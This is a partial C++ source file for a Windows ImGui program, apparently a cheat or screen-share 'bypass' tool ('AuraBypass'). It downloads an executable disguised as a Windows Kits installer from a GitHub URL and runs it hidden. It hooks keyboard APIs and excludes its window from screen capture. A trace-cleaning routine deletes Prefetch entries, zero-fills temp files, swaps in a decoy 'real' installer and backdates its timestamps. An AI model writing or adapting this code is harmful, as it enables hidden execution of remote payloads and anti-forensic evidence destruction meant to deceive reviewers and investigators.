#define _WIN32_WINNT 0x0A00

#include <Windows.h>
#include <d3d11.h>
#include <dwmapi.h>
#include <winhttp.h>
#include <process.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <cfloat>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <string.h>

#include "imgui.h"
#include "backends/imgui_impl_win32.h"
#include "backends/imgui_impl_dx11.h"
#include "fa_solid_900_ttf.h"
#include "IconsFontAwesome6.h"
#include "MinHook.h"

#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma warning(disable: 28251)

#ifndef ICON_MAX_16_FA
#define ICON_MAX_16_FA ICON_MAX_FA
#endif

static ID3D11Device* g_pd3dDevice = nullptr;
static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
static IDXGISwapChain* g_pSwapChain = nullptr;
static ID3D11RenderTargetView* g_mainRTV = nullptr;

static ImFont* g_fontIcons = nullptr;
static ImFont* g_fontText = nullptr;

static bool g_running = true;

static const float kPanelW = 600.0f;
static const float kPanelH = 320.0f;
static const float kRounding = 14.0f;
static const float kIconSize = 17.0f;
static const float kIconAtlasSize = 22.0f;
static const float kLabelSize = 15.0f;
static const float kTitlePadX = 14.0f;

static bool  s_dragging = false;
static POINT s_cursorStart = {};
static RECT  s_windowStart = {};

LRESULT WINAPI WndProc(HWND, UINT, WPARAM, LPARAM);
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);

static int s_injectingMode = 0;
static int s_cleaningMode = 0;

static HWND  g_overlayHwnd = nullptr;
static bool  s_lockKey = false;
static float s_lockKeyAnim = 0.0f;
static float s_lockKeyHover = 0.0f;

static bool  s_streamProof = true;
static float s_streamProofAnim = 0.0f;
static float s_streamProofHover = 0.0f;

typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
typedef HRESULT(WINAPI* DwmExtendFrameIntoClientArea_t)(HWND, const MARGINS*);
typedef SHORT(WINAPI* GetAsyncKeyState_t)(int);
typedef SHORT(WINAPI* GetKeyState_t)(int);

static DwmSetWindowAttribute_t        oDwmSetWindowAttribute = nullptr;
static DwmExtendFrameIntoClientArea_t oDwmExtendFrameIntoClientArea = nullptr;
static GetAsyncKeyState_t             oGetAsyncKeyState = nullptr;
static GetKeyState_t                  oGetKeyState = nullptr;

static HHOOK g_hKbHook = nullptr;

static void ApplyStreamProof() {
    if (!g_overlayHwnd) return;
    if (s_streamProof)
        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_EXCLUDEFROMCAPTURE);
    else
        ::SetWindowDisplayAffinity(g_overlayHwnd, WDA_NONE);
}

HRESULT WINAPI hkDwmSetWindowAttribute(HWND hwnd, DWORD attr, LPCVOID pv, DWORD cb) {
    HRESULT hr = oDwmSetWindowAttribute(hwnd, attr, pv, cb);
    if (hwnd == g_overlayHwnd)
        ApplyStreamProof();
    return hr;
}

HRESULT WINAPI hkDwmExtendFrameIntoClientArea(HWND hwnd, const MARGINS* m) {
    HRESULT hr = oDwmExtendFrameIntoClientArea(hwnd, m);
    if (hwnd == g_overlayHwnd)
        ApplyStreamProof();
    return hr;
}

SHORT WINAPI hkGetAsyncKeyState(int vKey) {
    if (s_lockKey && (vKey == VK_DELETE))
        return 0;
    return oGetAsyncKeyState(vKey);
}

SHORT WINAPI hkGetKeyState(int vKey) {
    if (s_lockKey && (vKey == VK_DELETE))
        return 0;
    return oGetKeyState(vKey);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && s_lockKey) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (kb && kb->vkCode == VK_DELETE)
            return 1;
    }
    return ::CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
}

static void InstallMinHooks() {
    if (MH_Initialize() != MH_OK) return;

    HMODULE hDwm = ::LoadLibraryW(L"dwmapi.dll");
    HMODULE hUser = ::GetModuleHandleW(L"user32.dll");

    if (hDwm) {
        LPVOID pDwmSet = (LPVOID)::GetProcAddress(hDwm, "DwmSetWindowAttribute");
        if (pDwmSet)
            MH_CreateHook(pDwmSet, &hkDwmSetWindowAttribute,
                (LPVOID*)&oDwmSetWindowAttribute);

        LPVOID pDwmExt = (LPVOID)::GetProcAddress(hDwm, "DwmExtendFrameIntoClientArea");
        if (pDwmExt)
            MH_CreateHook(pDwmExt, &hkDwmExtendFrameIntoClientArea,
                (LPVOID*)&oDwmExtendFrameIntoClientArea);
    }

    if (hUser) {
        LPVOID pGas = (LPVOID)::GetProcAddress(hUser, "GetAsyncKeyState");
        if (pGas)
            MH_CreateHook(pGas, &hkGetAsyncKeyState, (LPVOID*)&oGetAsyncKeyState);

        LPVOID pGks = (LPVOID)::GetProcAddress(hUser, "GetKeyState");
        if (pGks)
            MH_CreateHook(pGks, &hkGetKeyState, (LPVOID*)&oGetKeyState);
    }

    MH_EnableHook(MH_ALL_HOOKS);
}

static void UninstallMinHooks() {
    if (g_hKbHook) {
        ::UnhookWindowsHookEx(g_hKbHook);
        g_hKbHook = nullptr;
    }
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
}

void LoadFonts() {
    ImGuiIO& io = ImGui::GetIO();
    io.IniFilename = nullptr;

    static const ImWchar iconRanges[] = { ICON_MIN_FA, ICON_MAX_16_FA, 0 };

    ImFontConfig cfg;
    cfg.PixelSnapH = true;
    cfg.GlyphMinAdvanceX = kIconAtlasSize;
    cfg.FontDataOwnedByAtlas = false;

    if (g_fontIcons) return;

    char winDir[MAX_PATH] = {};
    if (::GetWindowsDirectoryA(winDir, MAX_PATH)) {
        char fontPath[MAX_PATH];
        wsprintfA(fontPath, "%s\\Fonts\\arialbd.ttf", winDir);
        g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
            io.Fonts->GetGlyphRangesDefault());
        if (!g_fontText) {
            wsprintfA(fontPath, "%s\\Fonts\\arial.ttf", winDir);
            g_fontText = io.Fonts->AddFontFromFileTTF(fontPath, kLabelSize, nullptr,
                io.Fonts->GetGlyphRangesDefault());
        }
    }
    if (!g_fontText) {
        ImFontConfig defCfg;
        defCfg.SizePixels = kLabelSize;
        g_fontText = io.Fonts->AddFontDefault(&defCfg);
    }

    g_fontIcons = io.Fonts->AddFontFromMemoryTTF(
        (void*)fa_solid_900_ttf, (int)fa_solid_900_ttf_len,
        kIconAtlasSize, &cfg, iconRanges);

    if (!g_fontIcons) {
        char modPath[MAX_PATH] = {};
        if (::GetModuleFileNameA(nullptr, modPath, MAX_PATH)) {
            if (char* slash = strrchr(modPath, '\\')) *slash = '\0';
            char fullPath[MAX_PATH];
            wsprintfA(fullPath, "%s\\fa-solid-900.ttf", modPath);
            g_fontIcons = io.Fonts->AddFontFromFileTTF(fullPath, kIconAtlasSize, &cfg, iconRanges);
        }
    }

    if (!g_fontIcons)
        io.Fonts->AddFontDefault();
}

static const wchar_t* kInstallerUrl =
L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
L"Kits%20Configuration%20Installer-x86-en-us.exe";

static const wchar_t* kInstallerRealUrl =
L"https://github.com/dawdasadadwda/-/raw/refs/heads/main/"
L"Kits%20Configuration%20Installer-x86-en-us-Real.exe";

static const wchar_t* kInstallerDir =
L"C:\\ProgramData\\Package Cache\\"
L"{E5D0CA8F-4587-D081-98CB-4A788BF2747E}v10.1.28000.2526\\Installers";

static const wchar_t* kInstallerFile =
L"Kits Configuration Installer-x86-en-us.exe";

static volatile LONG g_installerWasCached = 0;
static volatile LONG g_installerHadRunning = 0;
static volatile LONG g_installerDone = 0;
static volatile LONG g_installerFailed = 0;
static volatile LONG g_installerSlept = 0;

static volatile LONG g_cleanStage = 0;
static volatile LONG g_cleanFound = 0;
static volatile LONG g_cleanZeroFilled = 0;
static volatile LONG g_cleanDone = 0;
static volatile LONG g_cleanFailed = 0;

static bool EnsureDirectoryExists(const std::wstring& dir) {
    DWORD attr = ::GetFileAttributesW(dir.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
        return true;

    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos && pos > 2) {
        if (!EnsureDirectoryExists(dir.substr(0, pos)))
            return false;
    }
    if (::CreateDirectoryW(dir.c_str(), nullptr))
        return true;
    return ::GetLastError() == ERROR_ALREADY_EXISTS;
}

static bool FileExistsOnDisk(const std::wstring& path) {
    DWORD attr = ::GetFileAttributesW(path.c_str());
    return attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

static LONGLONG FileSizeOnDisk(const std::wstring& path) {
    WIN32_FILE_ATTRIBUTE_DATA fad = {};
    if (!::GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &fad))
        return -1;
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        return -1;
    LARGE_INTEGER sz = {};
    sz.HighPart = (LONG)fad.nFileSizeHigh;
    sz.LowPart = fad.nFileSizeLow;
    return sz.QuadPart;
}

static bool IsRealBySize(const std::wstring& path) {
    LONGLONG sz = FileSizeOnDisk(path);
    return sz > 0 && sz < (800LL * 1024LL);
}

static bool IsInstallerValid(const std::wstring& path) {
    HANDLE h = ::CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return false;

    LARGE_INTEGER sz = {};
    bool ok = false;

    do {
        if (!::GetFileSizeEx(h, &sz)) break;
        if (sz.QuadPart < (100LL * 1024LL)) break;

        DWORD read = 0;
        WORD mz = 0;
        if (!::ReadFile(h, &mz, sizeof(mz), &read, nullptr) || read != sizeof(mz)) break;
        if (mz != 0x5A4D) break;

        LARGE_INTEGER pos = {};
        pos.QuadPart = 0x3C;
        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;

        DWORD peOff = 0;
        if (!::ReadFile(h, &peOff, sizeof(peOff), &read, nullptr) || read != sizeof(peOff)) break;
        if (peOff < 0x40 || (LONGLONG)peOff + 4 > sz.QuadPart) break;

        pos.QuadPart = peOff;
        if (!::SetFilePointerEx(h, pos, nullptr, FILE_BEGIN)) break;

        DWORD peSig = 0;
        if (!::ReadFile(h, &peSig, sizeof(peSig), &read, nullptr) || read != sizeof(peSig)) break;
        if (peSig != 0x00004550) break;

        ok = true;
    } while (false);

    ::CloseHandle(h);
    return ok;
}

static bool ProcessRunningByName(const wchar_t* exeName) {
    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (::Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                found = true;
                break;
            }
        } while (::Process32NextW(snap, &pe));
    }
    ::CloseHandle(snap);
    return found;
}

struct EnumKillCtx {
    DWORD pid;
    bool sentClose;
};

static BOOL CALLBACK EnumWindowsKillProc(HWND hWnd, LPARAM lParam) {
    EnumKillCtx* ctx = (EnumKillCtx*)lParam;
    DWORD wndPid = 0;
    ::GetWindowThreadProcessId(hWnd, &wndPid);
    if (wndPid == ctx->pid) {
        ::PostMessageW(hWnd, WM_CLOSE, 0, 0);
        ctx->sentClose = true;
    }
    return TRUE;
}

static bool KillProcessByNameSoftly(const wchar_t* exeName) {
    HANDLE snap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    DWORD targetPid = 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (::Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                targetPid = pe.th32ProcessID;
                break;
            }
        } while (::Process32NextW(snap, &pe));
    }
    ::CloseHandle(snap);

    if (targetPid == 0) return false;

    EnumKillCtx ctx = { targetPid, false };
    ::EnumWindows(&EnumWindowsKillProc, (LPARAM)&ctx);

    HANDLE hProc = ::OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE,
        FALSE, targetPid);
    if (!hProc) return ctx.sentClose;

    DWORD w = ::WaitForSingleObject(hProc, 1500);
    if (w == WAIT_TIMEOUT) {
        ::TerminateProcess(hProc, 0);
        ::WaitForSingleObject(hProc, 1000);
    }

    ::CloseHandle(hProc);
    return true;
}

static bool DownloadFileToDisk(const std::wstring& url, const std::wstring& outPath) {
    bool ok = false;

    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    wchar_t hostName[256] = {};
    wchar_t urlPath[2048] = {};
    uc.lpszHostName = hostName;
    uc.dwHostNameLength = _countof(hostName);
    uc.lpszUrlPath = urlPath;
    uc.dwUrlPathLength = _countof(urlPath);

    if (!::WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc))
        return false;

    HINTERNET hSession = ::WinHttpOpen(L"AuraBypass/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = ::WinHttpConnect(hSession, hostName, uc.nPort, 0);
    if (!hConnect) { ::WinHttpCloseHandle(hSession); return false; }

    DWORD optFlags = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    ::WinHttpSetOption(hConnect, WINHTTP_OPTION_REDIRECT_POLICY,
        &optFlags, sizeof(optFlags));

    HINTERNET hRequest = ::WinHttpOpenRequest(hConnect, L"GET", urlPath,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        ::WinHttpCloseHandle(hConnect);
        ::WinHttpCloseHandle(hSession);
        return false;
    }

    if (::WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        ::WinHttpReceiveResponse(hRequest, nullptr)) {

        DWORD status = 0;
        DWORD sz = sizeof(status);
        ::WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

        if (status == 200) {
            HANDLE hFile = ::CreateFileW(outPath.c_str(), GENERIC_WRITE, 0,
                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwRead = 0;
                BYTE buffer[8192];
                ok = true;
                while (::WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead > 0) {
                    DWORD written = 0;
                    if (!::WriteFile(hFile, buffer, dwRead, &written, nullptr) || written != dwRead) {
                        ok = false;
                        break;
                    }
                }
                ::CloseHandle(hFile);
            }
        }
    }

    ::WinHttpCloseHandle(hRequest);
    ::WinHttpCloseHandle(hConnect);
    ::WinHttpCloseHandle(hSession);
    return ok;
}

static int PurgePrefetchByPrefix(const std::wstring& prefix) {
    int count = 0;

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = ::FindFirstFileW(L"C:\\Windows\\Prefetch\\*.pf", &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        if (_wcsnicmp(fd.cFileName, prefix.c_str(), prefix.size()) != 0)
            continue;

        std::wstring full = std::wstring(L"C:\\Windows\\Prefetch\\") + fd.cFileName;

        ::SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
        if (::DeleteFileW(full.c_str()))
            ++count;
    } while (::FindNextFileW(hFind, &fd));

    ::FindClose(hFind);
    return count;
}

static bool IsOurTmpName(const wchar_t* name) {
    if (!name) return false;

    size_t len = wcslen(name);
    if (len < 5) return false;
    if (len > 32) return false;

    if (_wcsicmp(name + len - 4, L".tmp") != 0) return false;

    const size_t stemLen = len - 4;
    if (stemLen < 1 || stemLen > 16) return false;

    for (size_t i = 0; i < stemLen; ++i) {
        wchar_t c = name[i];
        bool alnum =
            (c >= L'0' && c <= L'9') ||
            (c >= L'A' && c <= L'Z') ||
            (c >= L'a' && c <= L'z');
        if (!alnum) return false;
    }

    return true;
}

static void ZeroAndDeleteFile(const std::wstring& path) {
    ::SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);

    HANDLE h = ::CreateFileW(path.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (h != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz = {};
        if (::GetFileSizeEx(h, &sz) && sz.QuadPart > 0) {
            const DWORD kChunk = 64 * 1024;
            std::vector<BYTE> buf(kChunk, 0);

            LARGE_INTEGER zero = {};
            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);

            LONGLONG remaining = sz.QuadPart;
            while (remaining > 0) {
                DWORD toWrite = (DWORD)((remaining < (LONGLONG)kChunk) ? remaining : (LONGLONG)kChunk);
                DWORD written = 0;
                if (!::WriteFile(h, buf.data(), toWrite, &written, nullptr) || written != toWrite)
                    break;
                remaining -= toWrite;
            }
            ::FlushFileBuffers(h);

            ::SetFilePointerEx(h, zero, nullptr, FILE_BEGIN);
            ::SetEndOfFile(h);
            ::FlushFileBuffers(h);
        }
        ::CloseHandle(h);
    }

    if (!::DeleteFileW(path.c_str())) {
        ::MoveFileExW(path.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

static void PurgeTmpInDir(std::wstring dir) {
    while (!dir.empty() && (dir.back() == L'\\' || dir.back() == L'/'))
        dir.pop_back();
    if (dir.empty())
        return;

    std::wstring pattern = dir + L"\\*.tmp";

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = ::FindFirstFileW(pattern.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        if (!IsOurTmpName(fd.cFileName))
            continue;

        std::wstring full = dir + L"\\" + fd.cFileName;
        ZeroAndDeleteFile(full);
    } while (::FindNextFileW(hFind, &fd));

    ::FindClose(hFind);
}

static void PurgeRandomTmpFiles() {
    wchar_t buf[MAX_PATH] = {};
    DWORD n = ::GetTempPathW(MAX_PATH, buf);
    if (n > 0 && n < MAX_PATH)
        PurgeTmpInDir(buf);

    wchar_t local[MAX_PATH] = {};
    if (::SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local) == S_OK)
        PurgeTmpInDir(std::wstring(local) + L"\\Temp");

    PurgeTmpInDir(L"C:\\Windows\\Temp");

    wchar_t roaming[MAX_PATH] = {};
    if (::SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roaming) == S_OK)
        PurgeTmpInDir(std::wstring(roaming) + L"\\Temp");
}

static void BackdateFile12Hours(const std::wstring& path) {
    FILETIME ftNow = {};
    ::GetSystemTimeAsFileTime(&ftNow);

    ULONGLONG ticks = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

    const ULONGLONG twelveHours = 12ULL * 60ULL * 60ULL * 10000000ULL;
    if (ticks > twelveHours)
        ticks -= twelveHours;

    FILETIME ftNew = {};
    ftNew.dwLowDateTime = (DWORD)(ticks & 0xFFFFFFFFULL);
    ftNew.dwHighDateTime = (DWORD)(ticks >> 32);

    HANDLE h = ::CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return;

    ::SetFileTime(h, &ftNew, &ftNew, &ftNew);
    ::CloseHandle(h);
}

static unsigned __stdcall InstallerThreadProc(void*) {
    std::wstring dir(kInstallerDir);
    if (!EnsureDirectoryExists(dir)) {
        ::InterlockedExchange(&g_installerFailed, 1);
        ::InterlockedExchange(&g_installerDone, 1);
        return 0;
    }

    std::wstring fullPath = dir + L"\\" + kInstallerFile;

    const bool exists = FileExistsOnDisk(fullPath);
    const bool isReal = exists && IsRealBySize(fullPath);
    const bool isFakeOk = exists && !isReal && IsInstallerValid(fullPath);
    const bool alreadyCached = isFakeOk;

    if (alreadyCached)
        ::InterlockedExchange(&g_installerWasCached, 1);
    else if (exists) {
        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        ::DeleteFileW(fullPath.c_str());
    }

    if (!alreadyCached) {
        if (!DownloadFileToDisk(kInstallerUrl, fullPath)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }

        if (!IsInstallerValid(fullPath)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }
    }

    const bool alreadyRunning = ProcessRunningByName(kInstallerFile);
    if (alreadyRunning) {
        ::InterlockedExchange(&g_installerHadRunning, 1);
    }
    else {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        std::wstring cmdLine = L"\"" + fullPath + L"\"";

        DWORD flags = 0;
        if (s_injectingMode == 0)
            flags = CREATE_NO_WINDOW;

        if (!::CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, FALSE,
            flags, nullptr, dir.c_str(), &si, &pi)) {
            ::DeleteFileW(fullPath.c_str());
            ::InterlockedExchange(&g_installerFailed, 1);
            ::InterlockedExchange(&g_installerDone, 1);
            return 0;
        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
    }

    ::Sleep(2500);
    ::InterlockedExchange(&g_installerSlept, 1);
    ::InterlockedExchange(&g_installerDone, 1);
    return 0;
}

static void LaunchInstallerAsync() {
    ::InterlockedExchange(&g_installerWasCached, 0);
    ::InterlockedExchange(&g_installerHadRunning, 0);
    ::InterlockedExchange(&g_installerDone, 0);
    ::InterlockedExchange(&g_installerFailed, 0);
    ::InterlockedExchange(&g_installerSlept, 0);

    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, InstallerThreadProc, nullptr, 0, nullptr);
    if (h) ::CloseHandle(h);
}

static unsigned __stdcall CleanThreadProc(void*) {
    std::wstring dir(kInstallerDir);
    std::wstring fullPath = dir + L"\\" + kInstallerFile;

    ::InterlockedExchange(&g_cleanStage, 0);
    ::InterlockedExchange(&g_cleanFound, 0);

    KillProcessByNameSoftly(kInstallerFile);

    PurgePrefetchByPrefix(L"KITS CONFIGURATION INSTALLER");

    PurgeRandomTmpFiles();

    if (!EnsureDirectoryExists(dir)) {
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    if (FileExistsOnDisk(fullPath)) {
        ::SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        ::DeleteFileW(fullPath.c_str());
    }

    ::InterlockedExchange(&g_cleanStage, 1);

    if (!DownloadFileToDisk(kInstallerRealUrl, fullPath)) {
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    if (!IsInstallerValid(fullPath)) {
        ::DeleteFileW(fullPath.c_str());
        ::InterlockedExchange(&g_cleanFailed, 1);
        ::InterlockedExchange(&g_cleanDone, 1);
        return 0;
    }

    BackdateFile12Hours(fullPath);

    ::InterlockedExchange(&g_cleanFound, 1);
    ::InterlockedExchange(&g_cleanZeroFilled, 1);
    ::InterlockedExchange(&g_cleanStage, 3);
    ::InterlockedExchange(&g_cleanDone, 1);
    return 0;
}

static void CleanTracesAsync() {
    ::InterlockedExchange(&g_cleanStage, 0);
    ::InterlockedExchange(&g_cleanFound, 0);
    ::InterlockedExchange(&g_cleanZeroFilled, 0);
    ::InterlockedExchange(&g_cleanDone, 0);
    ::InterlockedExchange(&g_cleanFailed, 0);

    HANDLE h = (HANDLE)_beginthreadex(nullptr, 0, CleanThreadProc, nullptr, 0, nullptr);
    if (h) ::CloseHandle(h);
}

bool InRect(const ImVec2& p, const ImVec2& a, const ImVec2& b) {
    return p.x >= a.x && p.x <= b.x && p.y >= a.y && p.y <= b.y;
}

bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createFlags = 0;
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL levels[] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0 };

    HRESULT hr = DXGI_ERROR_UNSUPPORTED;
    for (UINT msaa = 4; msaa >= 1; msaa = (msaa == 4 ? 1 : 0)) {
        sd.SampleDesc.Count = msaa;
        hr = D3D11CreateDeviceAndSwapChain(
            nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, createFlags,
            levels, 2, D3D11_SDK_VERSION,
            &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
        if (hr == DXGI_ERROR_UNSUPPORTED)
            hr = D3D11CreateDeviceAndSwapChain(
                nullptr, D3D_DRIVER_TYPE_WARP, nullptr, createFlags,
                levels, 2, D3D11_SDK_VERSION,
                &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
        if (SUCCEEDED(hr)) break;
    }

    if (FAILED(hr)) return false;

    ID3D11Texture2D* backBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&backBuffer));
    if (backBuffer) {
        g_pd3dDevice->CreateRenderTargetView(backBuffer, nullptr, &g_mainRTV);
        backBuffer->Release();
    }
    return true;
}

void CleanupDeviceD3D() {
    if (g_mainRTV) { g_mainRTV->Release(); g_mainRTV = nullptr; }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = nullptr; }
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = nullptr; }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
}

void CreateRenderTarget() {
    ID3D11Texture2D* backBuffer = nullptr;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&backBuffer));
    if (backBuffer) {
        g_pd3dDevice->CreateRenderTargetView(backBuffer, nullptr, &g_mainRTV);
        backBuffer->Release();
    }
}

void CleanupRenderTarget() {
    if (g_mainRTV) { g_mainRTV->Release(); g_mainRTV = nullptr; }
}

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg) {
    case WM_SIZE:
        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED) {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) return 0;
        break;
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE) { ::PostQuitMessage(0); return 0; }
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}

void HandleDrag(HWND hWnd, const ImVec2& p, const ImVec2& q, const ImVec2& bp, const ImVec2& bq,
    const ImVec2& fp, const ImVec2& fq) {
    const ImVec2 mouse = ImGui::GetIO().MousePos;
    const bool overBtn = InRect(mouse, bp, bq) || InRect(mouse, fp, fq);

    if (!s_dragging) {
        const bool overPanel = InRect(mouse, p, q);
        const bool hovered = ImGui::IsWindowHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem);

        if (overPanel && !overBtn && hovered && ImGui::IsMouseClicked(ImGuiMouseButton_Left)) {
            ::GetCursorPos(&s_cursorStart);
            ::GetWindowRect(hWnd, &s_windowStart);
            s_dragging = true;
        }
        return;
    }

    if (ImGui::IsMouseReleased(ImGuiMouseButton_Left) || !ImGui::IsMouseDown(ImGuiMouseButton_Left)) {
        s_dragging = false;
        return;
    }

    POINT cur;
    ::GetCursorPos(&cur);
    const int x = s_windowStart.left + (cur.x - s_cursorStart.x);
    const int y = s_windowStart.top + (cur.y - s_cursorStart.y);
